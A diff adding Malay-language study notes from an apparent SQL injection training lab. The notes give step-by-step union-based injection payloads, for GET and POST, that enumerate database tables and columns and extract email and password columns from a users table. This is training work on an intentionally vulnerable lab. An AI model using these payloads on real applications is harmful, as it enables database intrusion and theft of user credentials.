@@ -43,3 +43,37 @@ payload `?id=-1'+union+all+select+1,group_concat(column_name),3,4,5+from+informa
 payload `?id=-1'+union+all+select+1,group_concat(email),group_concat(password),4,5+from+users--+` untuk display email dan password sebab kita dah tahu table mana untuk guna
 
 ![image](https://github.com/0hanif0/SQL-Injection-Training-Lab-notes/assets/23289982/9dd9dab2-4e32-46bd-add4-1fe787a87b68)
+
+## Level B - Basic POST SQL Injection
+beza get dgn post, kalu post tiada di url, kalu ada dia get
+
+payload `user1'` untuk test error page
+
+![image](https://github.com/0hanif0/SQL-Injection-Training-Lab-notes/assets/23289982/9b258237-6335-4e64-84cd-e29f02e2776b)
+
+payload `user1'-- ` untuk test vuln dan back to normal page, tips guna `space` untuk ganti `+` di get method
+
+![image](https://github.com/0hanif0/SQL-Injection-Training-Lab-notes/assets/23289982/e2337ce0-2c05-440b-85ba-c5aea13b2fd2)
+
+payload `user1'order by 5-- ` untuk cari berapa column yang ada dlm db, contoh sampai 6 dpt error bermaksud ada 5 colomn dlm db ini
+![image](https://github.com/0hanif0/SQL-Injection-Training-Lab-notes/assets/23289982/f1887807-0685-4449-b862-9c7a6161d3c8)
+
+payload `user-1'union all select 1,2,3,4,5-- ` untuk tgk username dan email dikeluarkan berada di column no berapa, berdasarkan gambar bawah username terletak di col 2 dan email terletak di col 3, `2,3` boleh replace apa2 code
+
+![image](https://github.com/0hanif0/SQL-Injection-Training-Lab-notes/assets/23289982/779ad3ae-ad74-440d-b9c9-699f86e803c4)
+
+payload `user-1'union all select 1,group_concat(table_name),3,4,5 from information_schema.tables-- ` untuk senaraikan semua db table dlm db information_schema
+
+![image](https://github.com/0hanif0/SQL-Injection-Training-Lab-notes/assets/23289982/31af9e0f-04ac-4619-a3be-74ae349f2f92)
+
+payload `user-1'union all select 1,group_concat(table_name),3,4,5 from information_schema.tables where table_schema=database()-- ` mcm step atas tapi ini filter kpd current db
+
+![image](https://github.com/0hanif0/SQL-Injection-Training-Lab-notes/assets/23289982/bc76091e-ebe5-494d-83c1-f2347a55f614)
+
+payload `user-1'union all select 1,group_concat(column_name),3,4,5 from information_schema.columns where table_name='users' and table_schema=database()-- ` untuk display semua jenis column untuk db table users
+
+![image](https://github.com/0hanif0/SQL-Injection-Training-Lab-notes/assets/23289982/5f3e4061-f448-4a3d-9985-f9624eee7177)
+
+payload `user-1'union all select 1,group_concat(email),group_concat(password),4,5 from users-- ` untuk senarai email dan password
+
+![image](https://github.com/0hanif0/SQL-Injection-Training-Lab-notes/assets/23289982/dc5c638f-be2f-4c0c-b3f9-5d86750151c9)
